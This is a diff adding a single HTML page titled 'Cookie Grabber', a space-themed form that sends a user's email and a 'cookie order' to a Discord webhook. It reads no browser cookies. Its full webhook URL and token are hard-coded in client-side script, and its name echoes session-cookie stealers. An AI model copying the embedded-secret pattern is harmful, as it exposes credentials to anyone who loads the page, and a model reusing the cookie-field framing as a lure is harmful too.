@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Cookie Grabber</title>
+<style>
+  /* Background: dark space */
+  body, html {
+    margin: 0; padding: 0; height: 100%;
+    overflow: hidden;
+    font-family: Arial, sans-serif;
+    background: radial-gradient(ellipse at center, #000011 0%, #000000 80%);
+    color: #eee;
+  }
+
+  /* Rain animation */
+  .rain {
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    pointer-events: none;
+    z-index: 1;
+  }
+
+  .drop {
+    position: absolute;
+    bottom: 100%;
+    width: 2px;
+    height: 15px;
+    background: #aad4ff;
+    opacity: 0.5;
+    animation: fall linear;
+  }
+
+  @keyframes fall {
+    to {
+      transform: translateY(100vh);
+      opacity: 0;
+    }
+  }
+
+  /* Centered frame */
+  .frame {
+    position: relative;
+    z-index: 10;
+    background: rgba(20, 20, 40, 0.85);
+    max-width: 360px;
+    margin: 5vh auto;
+    padding: 30px 25px;
+    border-radius: 15px;
+    box-shadow: 0 0 20px #3399ffaa;
+    text-align: center;
+  }
+
+  /* Planet */
+  .planet {
+    position: fixed;
+    right: 10%;
+    bottom: 15%;
+    width: 150px;
+    height: 150px;
+    background: radial-gradient(circle at 30% 30%, #7f8c8d, #2c3e50);
+    border-radius: 50%;
+    box-shadow: inset 10px 10px 20px #9eb6c6, inset -10px -10px 20px #1e2a38;
+    z-index: 5;
+  }
+
+  h1 {
+    margin: 0 0 20px;
+    font-weight: 700;
+    font-size: 2.5rem;
+    color: #81aaff;
+    text-shadow: 0 0 10px #81aaff;
+  }
+
+  label {
+    display: block;
+    margin: 12px 0 6px;
+    font-weight: 600;
+    text-align: left;
+    font-size: 1.1rem;
+  }
+
+  input[type="email"],
+  input[type="text"] {
+    width: 100%;
+    padding: 10px 12px;
+    font-size: 1rem;
+    border-radius: 8px;
+    border: none;
+    outline: none;
+  }
+
+  button {
+    margin-top: 20px;
+    width: 100%;
+    background: #3366ff;
+    border: none;
+    padding: 12px 0;
+    font-size: 1.2rem;
+    font-weight: 700;
+    color: white;
+    border-radius: 10px;
+    cursor: pointer;
+    box-shadow: 0 0 15px #3366ffaa;
+    transition: background 0.3s ease;
+  }
+  button:hover {
+    background: #5588ff;
+  }
+
+  .message {
+    margin-top: 20px;
+    font-weight: 600;
+  }
+</style>
+</head>
+<body>
+
+<div class="rain"></div>
+<div class="planet"></div>
+
+<div class="frame">
+  <h1>Cookie Grabber</h1>
+  <form id="orderForm">
+    <label for="email">Email:</label>
+    <input type="email" id="email" name="email" placeholder="you@example.com" required />
+
+    <label for="cookie">Cookie:</label>
+    <input type="text" id="cookie" name="cookie" placeholder="Your cookie order" required />
+
+    <button type="submit">Submit</button>
+  </form>
+  <div class="message" id="msg"></div>
+</div>
+
+<script>
+  // Create rain drops
+  const rainContainer = document.querySelector('.rain');
+  for(let i=0; i<100; i++) {
+    const drop = document.createElement('div');
+    drop.classList.add('drop');
+    drop.style.left = Math.random() * 100 + 'vw';
+    drop.style.animationDuration = (0.5 + Math.random()*0.7) + 's';
+    drop.style.animationDelay = (Math.random() * 5) + 's';
+    rainContainer.appendChild(drop);
+  }
+
+  // Form submit handler
+  const form = document.getElementById('orderForm');
+  const msg = document.getElementById('msg');
+  form.addEventListener('submit', async (e) => {
+    e.preventDefault();
+
+    const email = form.email.value.trim();
+    const cookie = form.cookie.value.trim();
+
+    if (!email || !cookie) {
+      msg.textContent = 'Please fill in all fields.';
+      msg.style.color = 'red';
+      return;
+    }
+
+    // Format Discord webhook message
+    const content = `**New Cookie Order!**\nEmail: ${email}\nCookie: ${cookie}`;
+
+    try {
+      const response = await fetch('https://ptb.discord.com/api/webhooks/1395752423204851793/3WS4peh43Kb4bM2MSWV1cGKVjbx3IsM1FZnOpbon1n3Wu_YpmTj5ow6DwNhbA_0Tw6Mm', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ content })
+      });
+
+      if(response.ok) {
+        msg.textContent = 'Order sent! Thank you.';
+        msg.style.color = '#66ff99';
+        form.reset();
+      } else {
+        throw new Error('Failed to send order.');
+      }
+    } catch(err) {
+      msg.textContent = 'Error sending order. Please try again.';
+      msg.style.color = 'red';
+    }
+  });
+</script>
+
+</body>
+</html>
